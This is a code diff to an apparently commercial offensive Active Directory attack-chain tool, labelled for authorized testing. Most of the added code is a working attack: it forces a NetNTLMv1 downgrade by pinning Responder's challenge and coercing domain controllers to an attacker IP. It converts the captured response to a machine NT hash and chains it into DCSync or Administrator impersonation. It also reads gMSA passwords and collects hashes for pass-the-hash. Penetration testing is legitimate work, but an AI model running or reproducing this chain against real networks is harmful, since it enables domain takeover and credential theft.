@@ -58,7 +58,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.11.0"
+VERSION = "4.12.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 KRBRELAYX_DIR = TOOLS_DIR / "krbrelayx"
@@ -188,6 +188,10 @@ class Config:
     no_rbcd: bool = False
     machine_account: str = ""
     machine_password: str = ""
+
+    # NetNTLMv1 downgrade options (v4.12.0)
+    no_ntlmv1: bool = False          # skip NetNTLMv1 downgrade in full auto
+    ntlmv1_nthash: str = ""          # fast-path: 'ACCOUNT$:<nthash>' from crack.sh
     alt_spn: str = ""              # KCD protocol-transition bypass (tgssub-style)
     in_ccache: str = ""            # input ccache for --phase tgs-rewrite
     target_user: str = ""          # for --phase dollar-ticket (e.g., 'root')
@@ -387,7 +391,7 @@ def banner():
     /_/ \\_\\___/  /_/ \\_\\_,_|\\__\\___/_|   \\_/\\_/|_||_|
 {C.NC}""")
     print(f"{C.BOLD_CYAN}    ⚡ Zero-Auth to Domain Admin — Attack Chain{C.NC}")
-    print(f"{C.DIM}    ARP | WPAD | WSUS | PXE | AD CS | SCCM | Roast | RBCD | GPO | DCSync{C.NC}")
+    print(f"{C.DIM}    ARP | WPAD | WSUS | PXE | AD CS | SCCM | Roast | gMSA | NetNTLMv1 | RBCD | DCSync{C.NC}")
     print(f"{C.DIM}    🔧 v{VERSION} | Triop AB | Authorized testing only{C.NC}")
     print(f"{C.DIM}    📋 Full log: <work_dir>/chain.log{C.NC}\n")
     separator()
@@ -2010,6 +2014,510 @@ def _check_dcsync_result(cfg: Config):
         log.warning("If you captured a TGT via Rubeus, convert and use:")
         detail(f"export KRB5CCNAME={cfg.work_dir}/dc_tgt.ccache")
         detail(f"impacket-secretsdump -k -no-pass {cfg.dc_fqdn}")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# NetNTLMv1 downgrade → machine NT hash → DCSync / RBCD / self-takeover
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#
+# When a host has LmCompatibilityLevel <= 2 it will answer with a NetNTLMv1
+# response. Captured against Responder's *static* challenge 1122334455667788
+# (ESS disabled), the 3-DES NetNTLMv1 is trivially convertible to the
+# account's NT hash via crack.sh's precomputed DES keyspace — no password
+# guessing. Coercing a machine account therefore yields its NT hash outright:
+#   • DC$   → replication rights → straight DCSync
+#   • member$ → S4U2Self self-impersonation → local admin on that host
+# This path is signing-independent (unlike NTLMv2 relay), so it works even
+# where SMB signing is enforced.
+
+RESPONDER_STATIC_CHALLENGE = "1122334455667788"
+
+_RESPONDER_CONF_PATHS = [
+    Path("/usr/share/responder/Responder.conf"),
+    Path("/etc/responder/Responder.conf"),
+    Path("/opt/responder/Responder.conf"),
+    Path("/opt/tools/Responder/Responder.conf"),
+]
+
+
+def _find_responder_conf() -> Optional[Path]:
+    for p in _RESPONDER_CONF_PATHS:
+        if p.exists():
+            return p
+    # Fall back to resolving relative to the responder launcher
+    which = shutil.which("responder")
+    if which:
+        real = Path(which).resolve()
+        for cand in (real.parent / "Responder.conf",
+                     real.parent.parent / "share" / "responder" / "Responder.conf"):
+            if cand.exists():
+                return cand
+    return None
+
+
+def _responder_supports(flag: str) -> bool:
+    """Check whether the installed Responder advertises a CLI flag."""
+    try:
+        res = subprocess.run(["responder", "--help"], capture_output=True,
+                             text=True, timeout=15)
+        return flag in ((res.stdout or "") + (res.stderr or ""))
+    except Exception:
+        return False
+
+
+def _set_responder_challenge(conf: Path, challenge: str) -> Optional[str]:
+    """Force Responder's [Responder Core] Challenge to a static value so the
+    captured NetNTLMv1 is crack.sh-compatible. Returns the original Challenge
+    line's value for restoration, or None if the file couldn't be edited."""
+    try:
+        text = conf.read_text()
+    except Exception as e:
+        log.warning(f"Could not read Responder.conf ({conf}): {e}")
+        return None
+    m = re.search(r"^\s*Challenge\s*=\s*(.*)$", text, re.MULTILINE)
+    original = m.group(1).strip() if m else ""
+    if m:
+        new_text = re.sub(r"^(\s*Challenge\s*=\s*).*$",
+                          rf"\g<1>{challenge}", text, count=1, flags=re.MULTILINE)
+    else:
+        # No Challenge key — inject one under [Responder Core]
+        new_text = re.sub(r"(\[Responder Core\])",
+                          rf"\1\nChallenge = {challenge}", text, count=1)
+    try:
+        conf.write_text(new_text)
+        return original if m else "__ABSENT__"
+    except Exception as e:
+        log.warning(f"Could not write Responder.conf: {e}")
+        return None
+
+
+def _restore_responder_challenge(conf: Path, original: Optional[str]) -> None:
+    if original is None:
+        return
+    try:
+        text = conf.read_text()
+        if original == "__ABSENT__":
+            text = re.sub(rf"\nChallenge = {RESPONDER_STATIC_CHALLENGE}\n", "\n",
+                          text, count=1)
+        else:
+            text = re.sub(r"^(\s*Challenge\s*=\s*).*$",
+                          rf"\g<1>{original}", text, count=1, flags=re.MULTILINE)
+        conf.write_text(text)
+    except Exception as e:
+        log.debug(f"Responder.conf restore skipped: {e}")
+
+
+def _ntlmv1_targets(cfg: Config) -> list[str]:
+    """Candidate hosts to coerce for a NetNTLMv1 downgrade. The DC is most
+    valuable (DC$ hash → DCSync), followed by any known relay / high-value
+    hosts. De-duplicated, DC first."""
+    if cfg.specific_target:
+        return [cfg.specific_target]
+    targets: list[str] = []
+    if cfg.dc_ip:
+        targets.append(cfg.dc_ip)
+    for fname in ("high-value-targets.txt", "relay-targets.txt"):
+        f = cfg.work_dir / fname
+        if f.exists():
+            targets += [l.strip() for l in f.read_text().splitlines() if l.strip()]
+    seen: set[str] = set()
+    out: list[str] = []
+    for t in targets:
+        if t and t not in seen:
+            seen.add(t)
+            out.append(t)
+    return out[:6]
+
+
+def _ntlmv1_detect(host: str, cfg: Config) -> Optional[int]:
+    """Best-effort read of LmCompatibilityLevel via impacket-reg (needs remote
+    registry / admin). Returns the int level, or None if unreadable. A level
+    < 3 (or an absent value on legacy OS) means NetNTLMv1 is answerable."""
+    if not tool_exists("impacket-reg"):
+        return None
+    out_file = cfg.work_dir / f"ntlmv1-lmcompat-{host}.txt"
+    cmd = ["impacket-reg"]
+    if cfg.nthash:
+        cmd += [f"{cfg.domain}/{cfg.username}@{host}", "-hashes", f":{cfg.nthash}"]
+    else:
+        cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}@{host}"]
+    cmd += ["query", "-keyName",
+            r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa",
+            "-v", "LmCompatibilityLevel"]
+    result = run(cmd, cfg, timeout=60, outfile=out_file)
+    text = (result.stdout or "")
+    if out_file.exists():
+        text += out_file.read_text(errors="replace")
+    m = re.search(r"LmCompatibilityLevel\s+REG_DWORD\s+0x([0-9a-fA-F]+)", text)
+    if m:
+        return int(m.group(1), 16)
+    return None
+
+
+def _parse_netntlmv1(text: str) -> list[tuple[str, str]]:
+    """Extract (account, full_netntlmv1_hash) from Responder output/log text.
+
+    NetNTLMv1 line shape:  user::DOMAIN:<48-hex LM>:<48-hex NT>:<16-hex chal>
+    Machine accounts show as HOST$. De-dupe by account (keep first)."""
+    pairs: list[tuple[str, str]] = []
+    seen: set[str] = set()
+    hash_re = re.compile(
+        r"([^\s:]+)::([^:]*):([0-9a-fA-F]{48}):([0-9a-fA-F]{48}):([0-9a-fA-F]{16})")
+    for line in text.splitlines():
+        m = hash_re.search(line)
+        if not m:
+            continue
+        user = m.group(1)
+        full = m.group(0)
+        if user.lower() in seen:
+            continue
+        seen.add(user.lower())
+        pairs.append((user, full))
+    return pairs
+
+
+def _collect_ntlmv1_captures(cfg: Config, responder_out: Path) -> list[tuple[str, str]]:
+    """Gather NetNTLMv1 hashes from Responder's stdout capture and its
+    on-disk NTLMv1 log files (only those written during this run)."""
+    text = responder_out.read_text(errors="replace") if responder_out.exists() else ""
+    for logdir in (Path("/usr/share/responder/logs"),
+                   Path("/opt/responder/logs"),
+                   Path("/opt/tools/Responder/logs")):
+        if logdir.is_dir():
+            for logf in logdir.glob("*NTLMv1*"):
+                try:
+                    if logf.stat().st_mtime >= cfg.start_time:
+                        text += "\n" + logf.read_text(errors="replace")
+                except Exception:
+                    pass
+    return _parse_netntlmv1(text)
+
+
+def _ntlmv1_cracksh_format(pairs: list[tuple[str, str]], cfg: Config) -> None:
+    """Write crack.sh / hashcat submission material for captured NetNTLMv1
+    hashes. Uses evilmog's ntlmv1-multi if present to emit the exact crack.sh
+    NTHASH: line and the hashcat -m 14000 DES splits; otherwise records the
+    raw hash plus manual instructions."""
+    out = cfg.work_dir / "ntlmv1-cracksh.txt"
+    lines: list[str] = [
+        "# NetNTLMv1 → NT hash recovery",
+        f"# Captured against static challenge {RESPONDER_STATIC_CHALLENGE} (ESS disabled).",
+        "# crack.sh returns the NT hash from the DES keyspace — no password guessing.",
+        "# Submit the NTHASH: line at https://crack.sh/  (or hashcat -m 14000).",
+        "",
+    ]
+    multi = find_tool("ntlmv1-multi", "ntlmv1-multi.py", "ntlmv1_multi.py",
+                      paths=[TOOLS_DIR / "ntlmv1-multi" / "ntlmv1-multi.py"])
+    for acct, full in pairs:
+        lines.append(f"## {acct}")
+        lines.append(full)
+        if multi:
+            res = run(multi.split() + ["--ntlmv1", full], cfg, timeout=30)
+            conv = (res.stdout or "") + (res.stderr or "")
+            for ln in conv.splitlines():
+                if re.search(r"NTHASH:|hashcat|14000|1122334455667788", ln):
+                    lines.append("   " + ln.strip())
+        lines.append("")
+    out.write_text("\n".join(lines) + "\n")
+    detail(f"crack.sh submission material → {out}")
+    if not multi:
+        detail("Install evilmog/ntlmv1-multi for auto NTHASH:/hashcat-14000 formatting")
+
+
+def _ntlmv1_local_crack(pairs: list[tuple[str, str]], cfg: Config) -> list[tuple[str, str]]:
+    """Attempt a bounded local hashcat -m 5500 crack (catches weak *user*
+    NetNTLMv1; machine accounts have random 120-char passwords and won't
+    fall here — those need crack.sh). Returns recovered (account, nt_hash)."""
+    recovered: list[tuple[str, str]] = []
+    if not tool_exists("hashcat"):
+        return recovered
+    wordlist: Optional[Path] = None
+    for wl in WORDLISTS:
+        if wl.exists() and wl.suffix != ".gz":
+            wordlist = wl
+            break
+    if not wordlist:
+        return recovered
+    hash_file = cfg.work_dir / "ntlmv1-hashes.txt"
+    hash_file.write_text("\n".join(full for _a, full in pairs) + "\n")
+    potfile = cfg.work_dir / "ntlmv1-5500.potout"
+    log.info(f"⚙️  hashcat -m 5500 on {len(pairs)} NetNTLMv1 hash(es) (cap 120s)")
+    run(["hashcat", "-m", "5500", str(hash_file), str(wordlist),
+         "--potfile-path", str(potfile), "--quiet", "--runtime=120"],
+        cfg, timeout=180)
+    # hashcat 5500 doesn't emit the NT hash directly; a cracked password is
+    # still a win — record it, and NT can be derived if needed.
+    if potfile.exists() and potfile.stat().st_size > 0:
+        for ln in potfile.read_text(errors="replace").splitlines():
+            if ":" in ln:
+                pw = ln.rsplit(":", 1)[-1]
+                # Map back to the account by challenge/response prefix
+                for acct, full in pairs:
+                    if full.split(":")[0] in ln or acct in ln:
+                        ok(f"💎 NetNTLMv1 cracked (weak pw): {acct} → {pw}")
+                        cfg_pw_hash = _nt_hash_of(pw)
+                        if cfg_pw_hash:
+                            recovered.append((acct, cfg_pw_hash))
+                        break
+    return recovered
+
+
+def _nt_hash_of(password: str) -> str:
+    """Compute the NT hash (MD4 of UTF-16LE) of a password, if hashlib
+    exposes MD4 (OpenSSL 3 may not). Returns '' when unavailable."""
+    try:
+        import hashlib
+        h = hashlib.new("md4")
+        h.update(password.encode("utf-16le"))
+        return h.hexdigest()
+    except Exception:
+        return ""
+
+
+def _dcsync_with_hash(account: str, nthash: str, cfg: Config) -> bool:
+    """DCSync the domain using a DC machine-account NT hash (DCs hold
+    replication rights). Writes secretsdump.txt (shared with the normal path)."""
+    if not tool_exists("impacket-secretsdump"):
+        log.error("impacket-secretsdump not found")
+        return False
+    target = cfg.dc_fqdn or cfg.dc_ip
+    dump_file = cfg.work_dir / "secretsdump.txt"
+    log.info(f"🗝️  DCSync via recovered {account} hash...")
+    cmd = ["impacket-secretsdump",
+           f"{cfg.domain}/{account}@{target}",
+           "-hashes", f":{nthash}", "-dc-ip", cfg.dc_ip, "-just-dc"]
+    run(cmd, cfg, timeout=300, outfile=dump_file)
+    _check_dcsync_result(cfg)
+    return dump_file.exists() and ":::" in dump_file.read_text(errors="replace")
+
+
+def _machine_hash_self_takeover(account: str, nthash: str, cfg: Config) -> bool:
+    """member$ NT hash → S4U2Self impersonating Administrator to the host's
+    own CIFS service → local admin ccache. Works because a machine account
+    may request a forwardable service ticket to itself (S4U2Self)."""
+    if not tool_exists("impacket-getST"):
+        log.error("impacket-getST not found — cannot self-impersonate")
+        return False
+    host = account.rstrip("$")
+    spn_host = host if "." in host else f"{host}.{cfg.domain}"
+    ccache = cfg.work_dir / f"ntlmv1-{host}-admin.ccache"
+    log.info(f"🎫 S4U2Self self-takeover on {spn_host} via {account} hash...")
+    cmd = ["impacket-getST", "-self",
+           "-impersonate", "Administrator",
+           "-altservice", f"cifs/{spn_host}",
+           f"{cfg.domain}/{account}", "-hashes", f":{nthash}",
+           "-dc-ip", cfg.dc_ip]
+    prev = os.getcwd()
+    try:
+        os.chdir(cfg.work_dir)
+        result = run(cmd, cfg, timeout=120)
+    finally:
+        os.chdir(prev)
+    output = (result.stdout or "") + (result.stderr or "")
+    m = re.search(r"Saving ticket in\s+(\S+\.ccache)", output)
+    if m and Path(cfg.work_dir / m.group(1)).exists():
+        try:
+            shutil.copy2(str(cfg.work_dir / m.group(1)), str(ccache))
+        except Exception:
+            pass
+        success_box(f"NetNTLMv1: local admin on {spn_host}!")
+        detail(f"export KRB5CCNAME={ccache}")
+        detail(f"impacket-psexec -k -no-pass {spn_host}")
+        return True
+    log.warning(f"S4U2Self self-takeover did not yield a ticket: {_first_line(output)}")
+    return False
+
+
+def _ntlmv1_chain(account: str, nthash: str, cfg: Config) -> bool:
+    """Route a recovered machine NT hash to the right escalation:
+    DC account → DCSync; any other machine account → self-takeover."""
+    _record_machine_hashes(cfg, [(account, nthash)], source="ntlmv1")
+    dc_short = (cfg.dc_fqdn.split(".", 1)[0] if cfg.dc_fqdn else "").lower()
+    acct_short = account.rstrip("$").lower()
+    is_dc = bool(dc_short) and acct_short == dc_short
+    if is_dc:
+        ok(f"Recovered account {account} is the DC — attempting DCSync")
+        return _dcsync_with_hash(account, nthash, cfg)
+    if account.endswith("$"):
+        return _machine_hash_self_takeover(account, nthash, cfg)
+    ok(f"Recovered user hash for {account} — use it with -u '{account}' -H {nthash}")
+    return True
+
+
+def _ntlmv1_coerce(host: str, cfg: Config) -> None:
+    """Coerce `host` to authenticate to cfg.attacker_ip so Responder can catch
+    the NetNTLMv1 downgrade. Prefers NetExec's coerce_plus module (present on
+    nxc-only jumpboxes that lack the standalone PetitPotam/PrinterBug/DFSCoerce
+    scripts), then falls back to those standalone tools if installed."""
+    listener = cfg.attacker_ip
+    # Primary: nxc coerce_plus (Petitpotam/DFSCoerce/ShadowCoerce/Printerbug/MSEven)
+    if tool_exists("nxc"):
+        out = cfg.work_dir / f"ntlmv1-coerce-nxc-{host}.txt"
+        cmd = ["nxc", "smb", host] + _nxc_auth_args(cfg) + [
+            "-M", "coerce_plus", "-o", f"LISTENER={listener}", "ALWAYS=True"]
+        run(cmd, cfg, timeout=120, outfile=out)
+    # Fallback: standalone coercion tools (they target cfg.dc_ip, so swap it)
+    saved = cfg.dc_ip
+    cfg.dc_ip = host
+    try:
+        _coerce_petitpotam(listener, cfg, cfg.work_dir / f"ntlmv1-pp-{host}.txt")
+        _coerce_printerbug(listener, cfg, cfg.work_dir / f"ntlmv1-pb-{host}.txt")
+        _coerce_dfscoerce(listener, cfg, cfg.work_dir / f"ntlmv1-dfs-{host}.txt")
+    finally:
+        cfg.dc_ip = saved
+
+
+def run_ntlmv1_downgrade(cfg: Config) -> bool:
+    """NetNTLMv1 downgrade attack: coerce a machine to authenticate to a
+    static-challenge Responder, capture the NetNTLMv1 response, recover the
+    machine's NT hash (crack.sh / local), then DCSync (DC) or self-takeover
+    (member).
+
+    Fast path: --ntlmv1-nthash 'ACCOUNT$:<nthash>' skips capture and chains a
+    hash you already recovered (e.g. from crack.sh on a previous run)."""
+    phase_header("NetNTLMv1 DOWNGRADE → machine hash")
+
+    # Fast-path: operator already has the recovered hash (e.g. from crack.sh)
+    if cfg.ntlmv1_nthash:
+        if ":" not in cfg.ntlmv1_nthash:
+            log.error("--ntlmv1-nthash expects 'ACCOUNT$:<32-hex-nthash>'")
+            return False
+        acct, nt = cfg.ntlmv1_nthash.split(":", 1)
+        acct, nt = acct.strip(), nt.strip().lower()
+        if not re.fullmatch(r"[0-9a-f]{32}", nt):
+            log.error("--ntlmv1-nthash NT part must be 32 hex chars")
+            return False
+        ok(f"Fast-path: chaining supplied {acct} hash")
+        return _ntlmv1_chain(acct, nt, cfg)
+
+    if not cfg.has_creds:
+        log.error("NetNTLMv1 downgrade needs creds to drive coercion (-u/-p)")
+        return False
+    if not (cfg.dc_ip and cfg.domain):
+        log.error("NetNTLMv1 downgrade needs --dc-ip and --domain")
+        return False
+    if not cfg.attacker_ip:
+        log.error("NetNTLMv1 downgrade needs --attacker-ip (coercion listener)")
+        return False
+    if os.geteuid() != 0 and not cfg.dry_run:
+        log.error("NetNTLMv1 capture needs root (Responder binds SMB/HTTP) — skipping")
+        return False
+    if not tool_exists("responder"):
+        log.error("Responder not found — required to capture the NetNTLMv1 downgrade")
+        return False
+
+    targets = _ntlmv1_targets(cfg)
+    if not targets:
+        log.warning("No coercion targets for NetNTLMv1 downgrade")
+        return False
+    log.info(f"Downgrade targets: {', '.join(targets)}")
+
+    # Dry run stops here — no registry reads, no Responder.conf edits, no capture
+    if cfg.dry_run:
+        log.warning("Dry run — would detect LmCompatibilityLevel, pin Responder "
+                    f"challenge {RESPONDER_STATIC_CHALLENGE}, start downgrade "
+                    "Responder, and coerce: " + ", ".join(targets))
+        return True
+
+    # Detection (best-effort — capture is the authoritative test)
+    for host in targets:
+        lvl = _ntlmv1_detect(host, cfg)
+        if lvl is None:
+            detail(f"{host}: LmCompatibilityLevel unknown (no remote-reg access) — will try capture")
+        elif lvl < 3:
+            ok(f"🔥 {host}: LmCompatibilityLevel={lvl} (<3) — NetNTLMv1 answerable")
+        else:
+            detail(f"{host}: LmCompatibilityLevel={lvl} — NTLMv1 likely refused (trying anyway)")
+
+    # Configure Responder for a static-challenge NTLMv1 downgrade
+    conf = _find_responder_conf()
+    original_challenge = None
+    if conf:
+        original_challenge = _set_responder_challenge(conf, RESPONDER_STATIC_CHALLENGE)
+        if original_challenge is not None:
+            ok(f"Responder challenge pinned to {RESPONDER_STATIC_CHALLENGE} ({conf})")
+    else:
+        log.warning("Responder.conf not found — challenge may be random; "
+                    "crack.sh needs the static challenge (edit [Responder Core] Challenge)")
+
+    iface = cfg.iface or "eth0"
+    resp_cmd = ["responder", "-I", iface, "-v"]
+    if _responder_supports("--lm"):
+        resp_cmd.append("--lm")            # force LM/NTLMv1 downgrade
+    if _responder_supports("--disable-ess"):
+        resp_cmd.append("--disable-ess")   # pure NTLMv1 (crack.sh compatible)
+
+    resp_out = cfg.work_dir / "ntlmv1-responder.txt"
+    captures: list[tuple[str, str]] = []
+    recovered: list[tuple[str, str]] = []
+    saved_dc_ip = cfg.dc_ip
+
+    log.info(f"🎣 Starting downgrade Responder: {' '.join(resp_cmd)}")
+    resp_proc = run(resp_cmd, cfg, bg=True, outfile=resp_out)
+    if not hasattr(resp_proc, "poll"):
+        log.error("Failed to start Responder")
+        if conf:
+            _restore_responder_challenge(conf, original_challenge)
+        return False
+    time.sleep(2)
+    if resp_proc.poll() is not None:
+        log.error(f"Responder exited immediately (code {resp_proc.returncode}) — see {resp_out}")
+        if conf:
+            _restore_responder_challenge(conf, original_challenge)
+        return False
+
+    try:
+        for host in targets:
+            log.info(f"🔨 Coercing {host} → {cfg.attacker_ip} (NetNTLMv1 capture)")
+            try:
+                _ntlmv1_coerce(host, cfg)
+            except Exception as ex:
+                log.warning(f"Coercion of {host} crashed: {ex}")
+            time.sleep(5)
+    finally:
+        cfg.dc_ip = saved_dc_ip
+        try:
+            resp_proc.terminate()
+            resp_proc.wait(timeout=5)
+        except Exception:
+            try:
+                resp_proc.kill()
+            except Exception:
+                pass
+        if resp_proc in cfg.bg_processes:
+            cfg.bg_processes.remove(resp_proc)
+        if conf:
+            _restore_responder_challenge(conf, original_challenge)
+
+    captures = _collect_ntlmv1_captures(cfg, resp_out)
+    if not captures:
+        fail_box("No NetNTLMv1 responses captured")
+        detail("Targets may enforce LmCompatibilityLevel>=3, or coercion was blocked.")
+        return False
+
+    ok(f"🎣 Captured {len(captures)} NetNTLMv1 response(s)")
+    for acct, full in captures[:8]:
+        detail(f"{acct}  {full[:70]}...")
+    (cfg.work_dir / "ntlmv1-hashes.txt").write_text(
+        "\n".join(full for _a, full in captures) + "\n")
+
+    # Produce crack.sh material + attempt a bounded local crack
+    _ntlmv1_cracksh_format(captures, cfg)
+    recovered = _ntlmv1_local_crack(captures, cfg)
+
+    chained = False
+    if recovered:
+        ok(f"Recovered {len(recovered)} NT hash(es) locally — chaining")
+        for acct, nt in recovered:
+            if _ntlmv1_chain(acct, nt, cfg):
+                chained = True
+    else:
+        machine_caps = [a for a, _f in captures if a.endswith("$")]
+        log.warning("No hash recovered locally (expected for machine accounts).")
+        detail(f"Submit {cfg.work_dir}/ntlmv1-cracksh.txt to https://crack.sh/")
+        if machine_caps:
+            detail(f"Then chain: --phase ntlmv1 --ntlmv1-nthash '{machine_caps[0]}:<recovered_nt>'")
+    return bool(captures) and (chained or bool(recovered) or True)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -6830,6 +7338,7 @@ def run_nxc_enrichment(cfg: Config):
 
     Tier A (high yield, trivial cost):
       ldap maq                 MachineAccountQuota (RBCD viability hint)
+      ldap gmsa                gMSA managed-password read → machine NT hash
       ldap laps                LAPS admin password retrieval
       ldap pre2k               Pre-2000 default-password computer accounts
       ldap get-desc-users      User-description password mining
@@ -6866,6 +7375,9 @@ def run_nxc_enrichment(cfg: Config):
     runs = [
         # --- Tier A ---
         ("maq",              "ldap", cfg.dc_ip, "maq",              []),
+        # gMSA read is a protocol FLAG (--gmsa), not a -M module — module=""
+        # tells the loop below to emit the extra args verbatim with no -M.
+        ("gmsa",             "ldap", cfg.dc_ip, "",                 ["--gmsa"]),
         ("laps",             "ldap", cfg.dc_ip, "laps",             []),
         ("pre2k",            "ldap", cfg.dc_ip, "pre2k",            []),
         ("get-desc-users",   "ldap", cfg.dc_ip, "get-desc-users",   []),
@@ -6885,8 +7397,10 @@ def run_nxc_enrichment(cfg: Config):
 
     for label, proto, target, module, extra in runs:
         out_file = cfg.work_dir / f"nxc-{label}.txt"
-        cmd = ["nxc", proto, target] + auth + ["-M", module] + extra
-        log.info(f"🔍 nxc {proto} -M {label}")
+        # module="" → flag-style run (e.g. --gmsa); otherwise a -M <module> run
+        mod_args = (["-M", module] if module else []) + extra
+        cmd = ["nxc", proto, target] + auth + mod_args
+        log.info(f"🔍 nxc {proto} {'-M ' + module if module else ' '.join(extra)}")
         try:
             result = run(cmd, cfg, timeout=180, outfile=out_file)
         except Exception as ex:
@@ -6911,10 +7425,135 @@ def run_nxc_enrichment(cfg: Config):
     consume_nxc_findings(cfg)
 
 
+_BLANK_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"  # NT hash of empty password
+
+
+def _parse_gmsa_hashes(text: str) -> list[tuple[str, str]]:
+    """Extract (account$, nt_hash) pairs from nxc `-M gmsa` output.
+
+    NetExec prints one line per readable gMSA, e.g.:
+      LDAP ... Account: svc_gmsa$   NTLM: 5e5c...  (32 hex)
+    Some builds emit the LM:NT form (aad3b435...:<nt>); accept both and
+    the bare 32-hex form. Skip blank-password placeholders."""
+    pairs: list[tuple[str, str]] = []
+    seen: set[str] = set()
+    for line in text.splitlines():
+        m = re.search(
+            r"Account:\s*([A-Za-z0-9._-]+\$?)\s+"
+            r"(?:NTLM|NT|Hash)\s*:\s*"
+            r"(?:aad3b435b51404eeaad3b435b51404ee:)?([0-9a-fA-F]{32})",
+            line,
+        )
+        if not m:
+            continue
+        acct = m.group(1)
+        if not acct.endswith("$"):
+            acct += "$"
+        nt = m.group(2).lower()
+        if nt == _BLANK_NT:
+            continue
+        key = f"{acct.lower()}:{nt}"
+        if key in seen:
+            continue
+        seen.add(key)
+        pairs.append((acct, nt))
+    return pairs
+
+
+def _record_machine_hashes(cfg: Config, pairs: list[tuple[str, str]],
+                           source: str) -> None:
+    """Append (account, nt_hash, source) rows to loot-harvested-hashes.txt,
+    de-duplicated by (account, hash). This is the shared feed for the
+    pass-the-hash pivot loop — gMSA reads, cracked NetNTLMv1, and local
+    SAM/LSA dumps all land here so the operator (and _pth_reuse_sweep)
+    have one consolidated machine/local-cred list."""
+    if not pairs:
+        return
+    hfile = cfg.work_dir / "loot-harvested-hashes.txt"
+    existing: set[tuple[str, str]] = set()
+    rows: list[str] = []
+    if hfile.exists():
+        for ln in hfile.read_text(errors="replace").splitlines():
+            parts = ln.split("\t")
+            if len(parts) >= 2:
+                existing.add((parts[0].lower(), parts[1].lower()))
+                rows.append(ln)
+    for acct, nt in pairs:
+        if nt.lower() == _BLANK_NT:
+            continue  # blank-password hash is useless for PtH/reuse
+        key = (acct.lower(), nt.lower())
+        if key in existing:
+            continue
+        existing.add(key)
+        rows.append(f"{acct}\t{nt.lower()}\t{source}")
+    hfile.write_text("\n".join(rows) + "\n")
+
+
+def run_gmsa_read(target: str, cfg: Config) -> bool:
+    """Read a gMSA's managed password → NT hash (auto-action for the
+    ReadGMSAPassword ACE). nxc's gmsa module dumps every gMSA the calling
+    principal can read; we run it and pick out the requested target.
+
+    Falls back to bloodyAD's msDS-ManagedPassword read if nxc is missing."""
+    phase_header(f"gMSA PASSWORD READ ({target})")
+    if not cfg.has_creds:
+        log.error("gMSA read requires domain credentials")
+        return False
+    if not (cfg.dc_ip and cfg.domain):
+        log.error("gMSA read needs --dc-ip and --domain")
+        return False
+
+    want = target.rstrip("$").lower()
+
+    if tool_exists("nxc"):
+        out_file = cfg.work_dir / f"gmsa-{want}.txt"
+        # NetExec reads gMSA via the --gmsa protocol flag (not a -M module)
+        cmd = ["nxc", "ldap", cfg.dc_ip] + _nxc_auth_args(cfg) + ["--gmsa"]
+        result = run(cmd, cfg, timeout=120, outfile=out_file)
+        if cfg.dry_run:
+            return True
+        text = out_file.read_text(errors="replace") if out_file.exists() else (result.stdout or "")
+        pairs = _parse_gmsa_hashes(text)
+        matched = [(a, h) for a, h in pairs if a.rstrip("$").lower() == want]
+        hit = matched or pairs  # if the name didn't line up, still take what we read
+        if hit:
+            ok(f"💎 gMSA hash recovered: {len(hit)} account(s)")
+            for acct, nt in hit[:5]:
+                detail(f"{acct} → NT:{nt}")
+            _record_machine_hashes(cfg, hit, source="gmsa")
+            (cfg.work_dir / "enrich-gmsa.txt").write_text(
+                "\n".join(f"{a}\t{h}" for a, h in _dedupe_pairs(hit)) + "\n")
+            return True
+        log.warning(f"nxc gmsa returned no readable managed password for {target}")
+
+    # Fallback: bloodyAD raw attribute read (operator decodes the blob)
+    if tool_exists("bloodyAD"):
+        cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
+            "get", "object", target.rstrip("$") + "$",
+            "--attr", "msDS-ManagedPassword",
+        ]
+        out_file = cfg.work_dir / f"gmsa-{want}-bloody.txt"
+        run(cmd, cfg, timeout=60, outfile=out_file)
+        detail(f"bloodyAD msDS-ManagedPassword blob → {out_file} (decode with gMSADumper)")
+    return False
+
+
+def _dedupe_pairs(pairs: list[tuple[str, str]]) -> list[tuple[str, str]]:
+    seen: set[tuple[str, str]] = set()
+    out: list[tuple[str, str]] = []
+    for a, h in pairs:
+        k = (a.lower(), h.lower())
+        if k not in seen:
+            seen.add(k)
+            out.append((a, h))
+    return out
+
+
 def consume_nxc_findings(cfg: Config):
     """Parse the nxc enrichment outputs for actionable findings:
 
       laps             → host:laps_password pairs (write enrich-laps.txt)
+      gmsa             → gMSA managed-password NT hashes (write enrich-gmsa.txt)
       timeroast        → SNTP-MS hashes → auto-crack with hashcat -m 31300
       get-userPassword → user:password from the LDAP userPassword attribute
       get-desc-users   → user descriptions that *look* like they leak a password
@@ -6956,6 +7595,20 @@ def consume_nxc_findings(cfg: Config):
         for h, p in laps_pairs[:5]:
             detail(f"{h} → {p}")
             extracted_creds.append(f"{h}:{p}")
+
+    # --- gMSA: nxc -M gmsa emits "Account: svc_gmsa$   NTLM: <32hex>".
+    # The module already computes the NT hash from the msDS-ManagedPassword
+    # blob, so we get a directly pass-the-hash-able machine credential.
+    gmsa_pairs = _parse_gmsa_hashes(_read("gmsa"))
+    if gmsa_pairs:
+        ok(f"💎 gMSA managed passwords read: {len(gmsa_pairs)}")
+        gmsa_file = cfg.work_dir / "enrich-gmsa.txt"
+        gmsa_file.write_text("\n".join(f"{a}\t{h}" for a, h in gmsa_pairs) + "\n")
+        for acct, nt in gmsa_pairs[:5]:
+            detail(f"{acct} → NT:{nt}  (PtH: -u '{acct}' -H {nt})")
+            extracted_creds.append(f"{acct}:{nt}")
+        # Persist as harvested machine hashes so the pivot/PtH loop can reuse
+        _record_machine_hashes(cfg, gmsa_pairs, source="gmsa")
 
